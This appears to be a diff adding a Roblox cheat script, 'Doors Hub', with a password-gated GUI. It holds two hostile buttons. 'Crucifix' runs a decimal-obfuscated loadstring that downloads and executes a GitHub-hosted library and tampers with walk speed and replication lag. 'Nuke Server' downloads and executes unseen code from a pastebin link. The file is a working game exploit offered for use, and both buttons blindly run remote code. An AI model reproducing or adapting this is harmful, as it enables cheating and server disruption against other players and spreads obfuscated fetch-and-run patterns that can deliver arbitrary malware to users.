@@ -1,0 +1,133 @@
+-- Made by SussyZaka
+local DoorsHub = Instance.new("ScreenGui")
+local LoginGui = Instance.new("Frame")
+local Credits = Instance.new("TextBox")
+local Buyer = Instance.new("TextBox")
+local Password = Instance.new("TextBox")
+local LoginButton = Instance.new("TextButton")
+local Title = Instance.new("TextLabel")
+local Scripts = Instance.new("Frame")
+local DoorsHubScripts = Instance.new("TextLabel")
+local Crucifix = Instance.new("TextButton")
+local NukeServer = Instance.new("TextButton")
+
+
+
+DoorsHub.Name = "Doors Hub"
+DoorsHub.Parent = game.CoreGui
+
+LoginGui.Name = "LoginGui"
+LoginGui.Parent = DoorsHub
+LoginGui.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+LoginGui.Position = UDim2.new(0.344242424, 0, 0.19183673, 0)
+LoginGui.Size = UDim2.new(0, 266, 0, 334)
+LoginGui.Active = true
+LoginGui.Draggable = true
+
+Credits.Name = "Credits"
+Credits.Parent = LoginGui
+Credits.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Credits.Position = UDim2.new(0.248120308, 0, 0.919161677, 0)
+Credits.Size = UDim2.new(0, 200, 0, 27)
+Credits.Font = Enum.Font.SourceSansBold
+Credits.Text = "by: neon mr stitchy cult#2457"
+Credits.TextColor3 = Color3.fromRGB(60, 213, 255)
+Credits.TextScaled = true
+Credits.TextSize = 14.000
+Credits.TextWrapped = true
+
+Password.Name = "Password"
+Password.Parent = LoginGui
+Password.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
+Password.Position = UDim2.new(0.124060154, 0, 0.494011998, 0)
+Password.Size = UDim2.new(0, 200, 0, 43)
+Password.Font = Enum.Font.SourceSans
+Password.Text = "Password"
+Password.TextColor3 = Color3.fromRGB(32, 37, 80)
+Password.TextScaled = true
+Password.TextSize = 14.000
+Password.TextWrapped = true
+
+LoginButton.Name = "LoginButton"
+LoginButton.Parent = LoginGui
+LoginButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+LoginButton.Position = UDim2.new(0.184210524, 0, 0.703592837, 0)
+LoginButton.Size = UDim2.new(0, 167, 0, 36)
+LoginButton.Font = Enum.Font.SourceSansBold
+LoginButton.Text = "Login"
+LoginButton.TextColor3 = Color3.fromRGB(0, 0, 127)
+LoginButton.TextScaled = true
+LoginButton.TextSize = 14.000
+LoginButton.TextWrapped = true
+LoginButton.MouseButton1Down:connect(function()
+	if Password.text == "ak917hdcbai" then
+		LoginGui.Visible = false
+		Scripts.Visible = true
+	end
+end)
+
+
+Title.Name = "Title"
+Title.Parent = LoginGui
+Title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Title.Size = UDim2.new(0, 266, 0, 50)
+Title.Font = Enum.Font.SourceSansBold
+Title.Text = "Doors Hub"
+Title.TextColor3 = Color3.fromRGB(0, 0, 0)
+Title.TextScaled = true
+Title.TextSize = 14.000
+Title.TextWrapped = true
+
+Scripts.Name = "Scripts"
+Scripts.Parent = DoorsHub
+Scripts.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
+Scripts.Position = UDim2.new(-0.00121205649, 0, 0.271428585, 0)
+Scripts.Size = UDim2.new(0, 190, 0, 241)
+Scripts.Visible = false
+Scripts.Active = true
+Scripts.Draggabe = true
+
+DoorsHubScripts.Name = "Doors Hub Scripts"
+DoorsHubScripts.Parent = Scripts
+DoorsHubScripts.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
+DoorsHubScripts.BorderColor3 = Color3.fromRGB(85, 170, 255)
+DoorsHubScripts.Position = UDim2.new(0.0631578937, 0, 0.0248962659, 0)
+DoorsHubScripts.Size = UDim2.new(0, 165, 0, 50)
+DoorsHubScripts.Font = Enum.Font.SourceSans
+DoorsHubScripts.Text = "Doors Hub Script"
+DoorsHubScripts.TextColor3 = Color3.fromRGB(0, 0, 127)
+DoorsHubScripts.TextScaled = true
+DoorsHubScripts.TextSize = 14.000
+DoorsHubScripts.TextStrokeColor3 = Color3.fromRGB(170, 85, 255)
+DoorsHubScripts.TextWrapped = true
+
+Crucifix.Name = "Crucifix"
+Crucifix.Parent = Scripts
+Crucifix.BackgroundColor3 = Color3.fromRGB(170, 85, 255)
+Crucifix.Position = UDim2.new(0.042105265, 0, 0.294605821, 0)
+Crucifix.Size = UDim2.new(0, 169, 0, 35)
+Crucifix.Font = Enum.Font.SourceSans
+Crucifix.Text = "Crucifix Script"
+Crucifix.TextColor3 = Color3.fromRGB(0, 0, 127)
+Crucifix.TextScaled = true
+Crucifix.TextSize = 14.000
+Crucifix.TextWrapped = true
+Crucifix.MouseButton1Down:connect(function()
+	loadstring("\115\101\116\116\105\110\103\32\61\32\115\101\116\116\105\110\103\115\40\41\46\78\101\116\119\111\114\107\10\108\111\99\97\108\32\69\102\102\101\99\116\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\67\111\108\111\114\67\111\114\114\101\99\116\105\111\110\69\102\102\101\99\116\34\41\10\69\102\102\101\99\116\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\76\105\103\104\116\105\110\103\10\69\102\102\101\99\116\46\83\97\116\117\114\97\116\105\111\110\32\61\32\45\51\10\69\102\102\101\99\116\46\66\114\105\103\104\116\110\101\115\115\32\61\32\48\10\69\102\102\101\99\116\46\67\111\110\116\114\97\115\116\32\61\32\48\10\10\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\10\108\111\99\97\108\32\108\105\98\114\97\114\121\32\61\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\108\111\111\100\98\97\108\108\47\45\98\97\99\107\45\117\112\115\45\102\111\114\45\108\105\98\115\47\109\97\105\110\47\119\97\108\108\37\50\48\118\51\39\41\41\41\40\41\10\10\108\111\99\97\108\32\119\32\61\32\108\105\98\114\97\114\121\58\67\114\101\97\116\101\87\105\110\100\111\119\40\34\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\119\105\110\100\111\119\10\10\108\111\99\97\108\32\98\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\84\105\109\101\32\83\116\111\112\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\44\101\116\99\41\10\10\108\111\99\97\108\32\99\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\84\105\109\101\32\67\108\111\99\107\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\44\101\116\99\41\10\10\108\111\99\97\108\32\97\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\68\101\115\116\114\111\121\32\71\117\105\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\82\101\109\111\118\101\32\89\111\117\114\32\71\117\105\44\101\116\99\41\10\10\10\98\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\51\44\32\49\48\53\44\32\49\55\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\98\58\66\117\116\116\111\110\40\34\83\116\111\112\32\84\105\109\101\34\44\102\117\110\99\116\105\111\110\40\41\10\9\9\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\116\114\117\101\10\9\9\115\101\116\116\105\110\103\46\73\110\99\111\109\105\110\103\82\101\112\108\105\99\97\116\105\111\110\76\97\103\32\61\32\51\48\48\48\10\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\42\32\51\10\101\110\100\41\10\10\98\58\66\117\116\116\111\110\40\34\85\110\115\116\111\112\32\84\105\109\101\34\44\102\117\110\99\116\105\111\110\40\41\10\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\49\54\10\9\9\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\9\32\32\32\32\115\101\116\116\105\110\103\46\73\110\99\111\109\105\110\103\82\101\112\108\105\99\97\116\105\111\110\76\97\103\32\61\32\48\10\9\9\10\101\110\100\41\10\10\97\58\68\101\115\116\114\111\121\71\117\105\40\41\10\10\99\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\51\44\32\49\48\53\44\32\49\55\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\99\58\66\111\120\40\34\67\108\111\99\107\32\84\105\109\101\34\44\34\110\117\109\98\101\114\34\44\102\117\110\99\116\105\111\110\40\118\97\108\117\101\41\32\45\45\32\34\110\117\109\98\101\114\34\32\111\114\32\34\115\116\114\105\110\103\34\10\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\67\108\111\99\107\84\105\109\101\32\61\32\118\97\108\117\101\10\101\110\100\41\10")()
+end)
+
+
+NukeServer.Name = "Nuke Server"
+NukeServer.Parent = Scripts
+NukeServer.BackgroundColor3 = Color3.fromRGB(170, 85, 255)
+NukeServer.Position = UDim2.new(0.042105265, 0, 0.464730322, 0)
+NukeServer.Size = UDim2.new(0, 169, 0, 35)
+NukeServer.Font = Enum.Font.SourceSans
+NukeServer.Text = "Nuke Server Script"
+NukeServer.TextColor3 = Color3.fromRGB(0, 0, 127)
+NukeServer.TextScaled = true
+NukeServer.TextSize = 14.000
+NukeServer.TextWrapped = true
+NukeServer.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/w9HSg3fN", true))()
+end)
